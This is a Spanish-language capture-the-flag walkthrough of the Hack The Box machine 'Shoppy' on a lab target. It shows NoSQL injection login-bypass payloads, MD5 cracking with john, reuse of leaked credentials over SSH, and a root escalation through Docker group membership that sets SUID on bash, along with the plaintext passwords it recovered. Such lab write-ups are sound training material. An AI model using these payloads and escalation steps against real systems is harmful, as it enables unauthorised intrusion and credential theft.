---
title: Hack The Box Shoppy
author: k4miyo
date: 2023-01-19
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [Web, Vulnerability Assessment, Injection, Common Applications, Custom Applications, Reversing, NGINX, Docker, C, Penetration Tester Level 1, Reconnaissance, Web Site Structure Discovery, Fuzzing, Password Reuse, Password Cracking, Brute Force Attack, Docker Abuse, Decompilation, SQL Injection, Weak Credentials, Clear Text Credentials, Information Disclosure]
ping: true
---

## Shoppy
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.11.180.

```bash
❯ ping -c 1 10.10.11.180
PING 10.10.11.180 (10.10.11.180) 56(84) bytes of data.
64 bytes from 10.10.11.180: icmp_seq=1 ttl=63 time=72.7 ms

--- 10.10.11.180 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 72.685/72.685/72.685/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.11.180 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-17 19:36 CST
Initiating Ping Scan at 19:36
Scanning 10.10.11.180 [4 ports]
Completed Ping Scan at 19:36, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:36
Scanning 10.10.11.180 [65535 ports]
Discovered open port 22/tcp on 10.10.11.180
Discovered open port 80/tcp on 10.10.11.180
Discovered open port 9093/tcp on 10.10.11.180
Completed SYN Stealth Scan at 19:36, 24.57s elapsed (65535 total ports)
Nmap scan report for 10.10.11.180
Host is up (0.080s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.84 seconds
           Raw packets sent: 70748 (3.113MB) | Rcvd: 70325 (2.813MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬──────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 122 B
───────┼──────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.180
   5   │     [*] Open ports: 22,80,9093
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80,9093 10.10.11.180 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-17 19:37 CST                                                                                                                             
Nmap scan report for 10.10.11.180        
Host is up (0.073s latency).                                                                  
                                                                                              
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)                                                                                                                       
| ssh-hostkey:                                                                                
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)            
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)           
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)         
80/tcp   open  http     nginx 1.23.1                                                          
|_http-server-header: nginx/1.23.1                                                            
|_http-title: Did not follow redirect to http://shoppy.htb                
9093/tcp open  copycat?                                                                       
| fingerprint-strings:                                                                        
|   GenericLines:                                                                             
|     HTTP/1.1 400 Bad Request                                                                
|     Content-Type: text/plain; charset=utf-8                                                 
|     Connection: close                                                                       
|     Request                                                                                 
|   GetRequest, HTTPOptions:                                                                  
|     HTTP/1.0 200 OK                                                                         
|     Content-Type: text/plain; version=0.0.4; charset=utf-8              
|     Date: Wed, 18 Jan 2023 01:37:39 GMT                                                     
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter                 
|     go_gc_cycles_automatic_gc_cycles_total 249                          
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter                    
|     go_gc_cycles_forced_gc_cycles_total 0                                                   
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter                     
|     go_gc_cycles_total_gc_cycles_total 249                                                  
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary                                                     
|     go_gc_duration_seconds{quantile="0"} 3.7664e-05                     
|     go_gc_duration_seconds{quantile="0.25"} 0.000147506                 
|_    go_g                                                                                    
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.92%I=7%D=1/17%Time=63C74D63%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2A60,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Wed,\x2
SF:018\x20Jan\x202023\x2001:37:39\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles_
SF:total\x20249\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Count
SF:\x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applicati
SF:on\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo_g
SF:c_cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total_g
SF:c_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n#\
SF:x20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycles_
SF:total_gc_cycles_total\x20249\n#\x20HELP\x20go_gc_duration_seconds\x20A\
SF:x20summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20collec
SF:tion\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo_gc
SF:_duration_seconds{quantile=\"0\"}\x203\.7664e-05\ngo_gc_duration_second
SF:s{quantile=\"0\.25\"}\x200\.000147506\ngo_g")%r(HTTPOptions,2A60,"HTTP/
SF:1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4;\x
SF:20charset=utf-8\r\nDate:\x20Wed,\x2018\x20Jan\x202023\x2001:37:39\x20GM
SF:T\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Count\x
SF:20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20ru
SF:ntime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20counter
SF:\ngo_gc_cycles_automatic_gc_cycles_total\x20249\n#\x20HELP\x20go_gc_cyc
SF:les_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\
SF:x20forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_forc
SF:ed_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x200
SF:\n#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20all
SF:\x20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_cyc
SF:les_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x20249\n#\x20H
SF:ELP\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x20
SF:duration\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go_gc
SF:_duration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\"0\"}\x2
SF:03\.7664e-05\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x200\.00014750
SF:6\ngo_g");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.26 seconds
```

Empezando primero por el puerto 80, de acuerdo con los resultados observados, nos encontramos con la leyenda "Did not follow redirect to http://shoppy.htb", por lo que podríamos pensar que se está aplicando virtual hosting; por lo tanto, agregamos el dominio a nuestro archivo `/etc/hosts`. Primero antes de otra cosa, vamos a ver a lo que nos enfrentamos con la herramienta `whatweb`:

```
❯ whatweb http://10.10.11.180/
http://10.10.11.180/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.23.1], IP[10.10.11.180], RedirectLocation[http://shoppy.htb], Title[301 Moved Permanently], nginx[1.23.1]
http://shoppy.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.23.1], IP[10.10.11.180], JQuery, Script, Title[Shoppy Wait Page][Title element contains newline(s)!], nginx[1.23.1]
```

Abrimos la el sitio web para validar su contenido.

![](/assets/images/htb-shoppy/shoppy.png)

No vemos nada interesante que nos pueda ayudar. Por lo tanto, vamos a tratar de enumerar posibles recursos dentro del servidor mediante el uso de `nmap`:

```
❯ nmap --script http-enum -p80 10.10.11.180 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-17 19:50 CST
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.072s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /login/: Login page

Nmap done: 1 IP address (1 host up) scanned in 173.71 seconds
```

Se tiene el recurso `/login/`; por lo que podriamos echarle un ojo:

![](/assets/images/htb-shoppy/shoppy1.png)

Si tratamos de hacer enumeración de usuarios, vemos que no nos indica cuando un usuario es válido; por lo tanto trataremos de realizar una injección con `' or 1=1-- -` en el campo de username y sin contraseña.

![](/assets/images/htb-shoppy/shoppy2.png)

La página tarda en cargar y al final nos muestra un código de estado de 504; por lo que podría funcionar realizar una inyección SQL. Probando varias, no vemos resultados, por lo que ahora se tratará de hacer inyección NoSQL y se pueden tomar ejemplos de la página de confianza [HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection) Aplicando la sentencia `admin' || '1==1` en el campo username y cualquier cosa en el campo password, vemos que accedemos al contenido.

![](/assets/images/htb-shoppy/shoppy3.png)

Al dar click en ***Search for users***, podemos buscar un usuario en específico, por lo que probaremos para **admin**.

![](/assets/images/htb-shoppy/shoppy4.png)

Vemos que podemos descargar un json, pero igual nos interesaría saber si existen más usuarios; por lo tanto, aplicaremos la misma inyección `admin' || '1==1` sobre el cuadro de búsqueda.

![](/assets/images/htb-shoppy/shoppy5.png)

Tenemos los usuarios **admin** y **josh** con sus respectivas contraseñas, por lo tanto, vamos a tratar de crackearlas.

```
❯ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
remembermethisway (?)
1g 0:00:00:00 DONE (2023-01-17 22:01) 1.818g/s 26078Kp/s 26078Kc/s 27555KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Tenemos la contraseña del usuario **josh** que es **remembermethisway**. Podríamos tratar de acceder por el puerto 22 con las credenciales obtenidas; sin embargo, no podemos acceder. Vamos a tratar de enumerar el servidor web buscando posibles subdominios.

```
❯ wfuzz -c -L --hc=404 --hw=129,11 -w /opt/SecLists/Discovery/Web-Content/oauth-oidc-scopes.txt -H "Host: FUZZ.shoppy.htb" http://10.10.11.180
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.180/
Total requests: 578

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000021:   200        0 L      141 W      3122 Ch     "Mattermost"                                                                                                               

Total time: 0
Processed Requests: 578
Filtered Requests: 577
Requests/sec.: 0
```

Mediante el uso de diversos diccionarios, encontramos unos de [SecLists](https://github.com/danielmiessler/SecLists) con el cual obtuvimos un subodminio `http://mattermost.shoppy.htb`, por lo que vamos a echarle un ojo (**Nota**: No olvidar agregar el subdominio en el archivo `/etc/hosts`).

![](/assets/images/htb-shoppy/shoppy6.png)

Tenemos un panel de login, por lo que podemos tratar de acceder con las credenciales que tenemos:

![](/assets/images/htb-shoppy/shoppy7.png)

Vemos que al acceder, nos encontramos en la plataforma [MasterMost](https://mattermost.com/), por lo que vamos a echarle un ojo a los mensajes que se tienen.

![](/assets/images/htb-shoppy/shoppy8.png)

Dentro del canal ***Deploy Machine*** nos encontramos una credenciales; por lo que podríamos tratar de acceder por SSH.

```
❯ ssh jaeger@shoppy.htb
The authenticity of host 'shoppy.htb (10.10.11.180)' can't be established.
ECDSA key fingerprint is SHA256:KoI81LeAk+ps7zoc1ru39Mg7srdxjzOb1UgmdW6T6kI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'shoppy.htb,10.10.11.180' (ECDSA) to the list of known hosts.
jaeger@shoppy.htb's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
manpath: can't set the locale; make sure $LC_* and $LANG are correct
jaeger@shoppy:~$ whoami
jaeger
jaeger@shoppy:~$
```

Ya nos encontramos dentro de la máquina y podemos visualizar el archivo user.txt. Ahora vamos a tratar de escalar privilegios. Enumerando un poco el sistema, vemos que podemos ejecutar el archivo `/home/deploy/password-manager` como el usuario **deploy**

```
jaeger@shoppy:~$ id
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
jaeger@shoppy:~$ ls -l /home/deploy/password-manager
-rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 /home/deploy/password-manager
jaeger@shoppy:~$
```

Tenemos permisos de lectura, así que vamos a echarle un ojito.

```
jaeger@shoppy:~$ file /home/deploy/password-manager                                                                                                                                  [78/78]
/home/deploy/password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f3
43348080d2905d1, for GNU/Linux 3.2.0, not stripped                                                                                                                                          
jaeger@shoppy:~$ strings /home/deploy/password-manager
/lib64/ld-linux-x86-64.so.2                                                                   
__gmon_start__
_ITM_deregisterTMCloneTable                                                                   
_ITM_registerTMCloneTable
_ZNSaIcED1Ev                       
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
_ZSt3cin                           
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc
_ZNSt8ios_base4InitD1Ev                                                                       
_ZNSolsEPFRSoS_E    
__gxx_personality_v0         
_ZNSaIcEC1Ev                          
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
_ZNSt8ios_base4InitC1Ev            
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev
_ZSt4cout  
_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4_
_ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE
_Unwind_Resume                
__cxa_atexit        
system                    
__cxa_finalize
__libc_start_main                                                                             
libstdc++.so.6     
libgcc_s.so.1 
libc.so.6         
GCC_3.0  
GLIBC_2.2.5     
CXXABI_1.3        
GLIBCXX_3.4          
GLIBCXX_3.4.21                                                                                
u/UH   
[]A\A]A^A_    
Welcome to Josh password manager!
Please enter your master password:                                                            
Access granted! Here is creds !
cat /home/deploy/creds.txt                                                                    
Access denied! This incident will be reported !
```

Dentro de las cadenas imprimibles, vemos que nos solicita ingresar la contraseña maestra y además nos arroja el contenido del archivo `/home/deploy/creds.txt`. Vamos a pasarle el parámetro `-e` al comenado `strings` para tratar de ver contenido que se encuentra cifrado. El parámetro `-e` requiere de un valor que, para este caso, utilizaremos **l - 16-bit littleendian**.

```
jaeger@shoppy:~$ strings -el /home/deploy/password-manager
Sample
jaeger@shoppy:~$
```

Tenemos la cadena de texto ***Sample***; por lo que podríamos usarla de contraseña al momoento de ejeuctar el binario.

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
jaeger@shoppy:~$
```

Tenemos las credenciales del usuario **deploy**, por lo que podemos migrar a dicho usuario.

```
jaeger@shoppy:~$ su deploy
Password: 
$ /bin/bash
deploy@shoppy:/home/jaeger$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
deploy@shoppy:/home/jaeger$
```

El usuario **deploy** se encuentra dentro del gropo ***docker***; por lo que ya sabemos como escalar privilegios.

```
deploy@shoppy:/home/jaeger$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   6 months ago   5.53MB
deploy@shoppy:/home/jaeger$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
deploy@shoppy:/home/jaeger$
```

Tenemos la imagen de un alpine y no se tienen máquinas corriendo; por lo que vamos a tratar de correr la máquina montando la raiz de la máquina victima.

```
deploy@shoppy:/home/jaeger$ docker run --rm -it -v /:/mnt alpine /bin/sh
/ # whoami
root
/ #
```

Dentro del contenedor tenemos montada la raíz de la máquina víctima, por lo que podemos retocar el archivo `/bin/sh` y darle permisos SUID.

```
/mnt/usr/bin # pwd
/mnt/bin
/mnt/usr/bin # chmod 7555 bash
/mnt/usr/bin # ls -la bash
-r-sr-sr-t    1 root     root       1234376 Mar 27  2022 bash
/mnt/usr/bin # exit
```

Nos salimos del contenedor y ejecutamos `bash -p` para convertirnos en **root**.

```
deploy@shoppy:/home/jaeger$ 
deploy@shoppy:/home/jaeger$ bash -p
bash-5.1# whoami
root
bash-5.1#
```

A este punto ya somo el usuario root y podemos visualizar la flag root.txt.
